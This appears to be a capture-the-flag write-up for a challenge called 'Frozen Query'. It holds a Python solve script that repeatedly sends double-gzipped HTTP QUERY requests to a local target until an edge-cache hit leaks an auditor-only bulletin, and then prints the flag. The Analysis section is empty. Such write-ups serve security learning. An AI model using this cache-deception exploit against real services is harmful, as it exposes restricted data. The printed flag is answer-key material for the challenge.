# Frozen Query

## Description
The Glacier Avalanche Service moved its bulletins to the shiny new HTTP QUERY
method from RFC 10008. Thanks to the edge cache, the summit auditor's
reports are served faster than ever.

Only auditors may read the summit bulletin. Right?

## Analysis

## Script
```python
#!/usr/bin/env python3

import gzip
import json
import sys
import time
import requests

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:1337"


def double_gzip(data: bytes) -> bytes:
    return gzip.compress(gzip.compress(data))


def try_window(window: int):
    body = json.dumps(
        {"region": "summit", "fields": ["level", "note", "flag"], "window": window}
    ).encode()
    payload = double_gzip(body)

    r = requests.request(
        "QUERY",
        f"{BASE}/api/bulletin",
        data=payload,
        headers={
            "Content-Type": "application/json",
            "Accept": "application/json",
            "Content-Encoding": "gzip, gzip",
        },
        timeout=5,
    )
    return r


def main():
    print(f"[*] Target: {BASE}")
    deadline = time.time() + 90
    seen_windows = set()
    while time.time() < deadline:
        window = int(time.time() // 30)
        if window not in seen_windows:
            seen_windows.add(window)
            print(f"[*] Trying window={window}")
        r = try_window(window)
        cache_status = r.headers.get("X-Cache", "?")
        print(f"    -> HTTP {r.status_code}  X-Cache={cache_status}  body={r.text[:200]}")
        if r.status_code == 200 and cache_status == "HIT" and '"flag"' in r.text:
            print("\n[+] Got the flag via cache deception:")
            print("   ", json.loads(r.text))
            return 0
        time.sleep(1)
    print("[-] Did not get a HIT with flag in time window")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
```

## Flag
```
gctf{QU3RY_c4ch3_k3y5_mu5t_c0v3r_th3_wh0l3_r3qu35t}
```
